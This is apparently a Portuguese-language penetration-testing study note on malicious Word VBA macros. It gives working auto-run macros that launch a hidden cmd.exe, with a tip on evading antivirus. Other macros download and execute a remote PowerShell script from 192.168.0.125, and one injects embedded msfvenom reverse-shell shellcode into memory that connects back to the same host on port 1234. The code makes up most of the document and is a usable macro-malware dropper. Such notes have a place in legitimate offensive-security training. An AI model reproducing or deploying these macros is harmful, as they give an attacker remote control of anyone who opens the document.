# Script inicial para execução automática

```vbnet
' Função utilizada para inicio automático ao abrir arquivo .doc
Sub Document_Open()
 Main
End Sub

' Função utilizada para inicio automático ao abrir arquivo .doc
Sub AutoOpen()
 Main
End Sub

' Início do programa
Sub Main()
 MsgBox ("This is a macro test")
End Sub
```

# Execução de programas

```vbnet
' Função utilizada para inicio automático ao abrir arquivo .doc
Sub Document_Open()
 Main
End Sub

' Função utilizada para inicio automático ao abrir arquivo .doc
Sub AutoOpen()
 Main
End Sub


Sub Main()
 ' Declara a variável "comando" como uma palavra
 Dim comando As String
 comando = "cmd.exe"
 
 ' Executa o comando no terminal
 ' Levar em consideração que a palavra "Shell" pode ser detectada como maliosa em alguns antivirus
 Shell comando, vbHide

 ' Outra forma de iniciar um programa não utilizando a palavra "Shell"
 ' O 0 significa que o programa executado ficará com a janela invisível
 CreateObject("Wscript.Shell").Run comando, 0
End Sub

' Como o VBA não tem uma função nativa que espera por um período de tempo, essa função simula essa espera de tempo em segundos
Sub Sleep(espera As Long)
 ' Declara a variável "tempo_atual" como o tipo de data
 Dim tempo_atual As Date
 ' Salva o tempo atual na variável
 tempo_atual = Now
 Do
 ' Segundo o site https://learn.microsoft.com/en-us/office/vba/language/reference/user-interface-help/doevents-function
 ' The DoEvents function returns an Integer representing the number of open forms in stand-alone versions of Visual Basic, such as Visual Basic, Professional Edition. DoEvents returns zero in all other applications.
 ' DoEvents passes control to the operating system. Control is returned after the operating system has finished processing the events in its queue and all keys in the SendKeys queue have been sent.
  DoEvents
 ' Realiza um loop até que o tempo atual seja maior que a variável "tempo_atual" acrescidos de "espera" em segundos
 ' Agora >= tempo_atual + espera
 Loop Until Now >= DateAdd("s", espera, tempo_atual)
End Sub
```
* Utilização do Word e PowerShell com API do Windows
* Arquivo utilizado presente em [PowerShell com API](../PowerShell/resumo.md#executando-shellcode)
```vbnet
' Script para chamar um arquivo em PowerShell, utilizar a função DownloadString que carrega o conteúdo do arquivo na memória

Sub MyMacro()
    Dim comando As String
    comando = "powershell (New-Object 
System.Net.WebClient).DownloadString('http://192.168.0.125:1235/run.ps1') | IEX"
    Shell comando, vbHide
End Sub

Sub Document_Open()
    MyMacro 
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

# Comunicação com API do Windows

>Declarar os argumentos e seus tipos de dados. Esta parte pode ser desafiadora porque os tipos de dados que o Windows usa não correspondem aos tipos de dados do Visual Studio. O Visual Basic faz muito do trabalho para você convertendo argumentos em tipos de dados compatíveis, um processo chamado empacotamento. Você pode controlar explicitamente como os argumentos são empacotados usando o atributo MarshalAsAttribute definido no namespace System.Runtime.InteropServices.
>
> Referência: https://learn.microsoft.com/en-us/dotnet/visual-basic/programming-guide/com-interop/walkthrough-calling-windows-apis

[Sumário de referência para Win32API](Win32API_PtrSafe.txt)

## Diferenciação entre Excel 64 bit e Excel 32 bit

```vbnet
#If VBA7 Then
    'for 64-bit Excel
    Declare PtrSafe Sub Sleep Lib "kernel32" Alias "Sleep" (ByVal dwMilliseconds As LongPtr)
#Else
    'for 32-bit Excel
    Declare Sub Sleep Lib "kernel32" Alias "Sleep" (ByVal dwMilliseconds As Long)
#End If
```
## Integração com a API do Windows

```vbnet
'	BOOL GetUserNameA(
'		LPSTR lpBuffer,
'		LPDWORD pcbBuffer
'	);

Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Function Main()
 Dim resultado As Long
 Dim Buffer As String * 256
 Dim TamanhoBuffer As Long
 TamanhoBuffer = 256
 
 resultado = GetUserName(Buffer, TamanhoBuffer)
 MsgBox resultado
End Function
```
## Execução de shellcode

```vbnet
'   LPVOID VirtualAlloc(
'       LPVOID lpAddress,
'       SIZE_T dwSize,
'       DWORD flAllocationType,
'       DWORD flProtect
'   );

'   VOID RtlMoveMemory(
'       VOID UNALIGNED *Destination,
'       VOID UNALIGNED *Source,
'       SIZE_T Length
'   );

'   HANDLE CreateThread(
'       LPSECURITY_ATTRIBUTES lpThreadAttributes,
'       SIZE_T dwStackSize,
'       LPTHREAD_START_ROUTINE lpStartAddress,
'       LPVOID lpParameter,
'       DWORD dwCreationFlags,
'       LPDWORD lpThreadId
'   );

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Public Enum ALLOCATION_TYPE
    MEM_COMMIT = &H1000
    MEM_RESERVE = &H2000
End Enum

Sub Main()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long

    ' msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.125 LPORT=1234 -f vbapplication EXITFUNC=thread
    ' Embora o sistema esteja executando como 64 bits, o Word instala a versão de 32 bits
    buf = Array(252, 232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
    207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 51, 50, 0, 0, 104, 119, 115, 50, 95, 84, 104, 76, 119, 38, 7, 255, 213, 184, 144, 1, 0, 0, 41, _
    196, 84, 80, 104, 41, 128, 107, 0, 255, 213, 80, 80, 80, 80, 64, 80, 64, 80, 104, 234, 15, 223, 224, 255, 213, 151, 106, 5, 104, 192, 168, 0, 125, 104, 2, 0, 4, 210, 137, 230, 106, 16, 86, 87, 104, 153, 165, 116, 97, 255, 213, 133, 192, 116, 12, 255, 78, 8, 117, 236, 104, 240, 181, 162, 86, 255, 213, 104, 99, 109, 100, 0, 137, 227, 87, 87, 87, 49, 246, 106, _
    18, 89, 86, 226, 253, 102, 199, 68, 36, 60, 1, 1, 141, 68, 36, 16, 198, 0, 68, 84, 80, 86, 86, 86, 70, 86, 78, 86, 86, 83, 86, 104, 121, 204, 63, 134, 255, 213, 137, 224, 78, 86, 70, 255, 48, 104, 8, 135, 29, 96, 255, 213, 187, 224, 29, 42, 10, 104, 166, 149, 189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, _
    83, 255, 213)

    ' lpAddress setado como 0 passa para o kernel escolher o espaço de memória a ser reservado
    ' Ubound pega a quantidade de itens dentro do Array
    ' flAllocationType é setado como 0x3000, operação bitwise or entre 0x1000 e 0x2000
    ' flProtect seta como 0x40 que significa permissões de leitura, escrita e execução
    
    addr = VirtualAlloc(0, UBound(buf), ALLOCATION_TYPE.MEM_COMMIT Or ALLOCATION_TYPE.MEM_RESERVE, &H40)

    For contador = LBound(buf) To UBound(buf)
        data = buf(contador)
        res = RtlMoveMemory(addr + contador, data, 1)
    Next contador

    res = CreateThread(0, 0, addr, 0, 0, 0)

End Sub
```

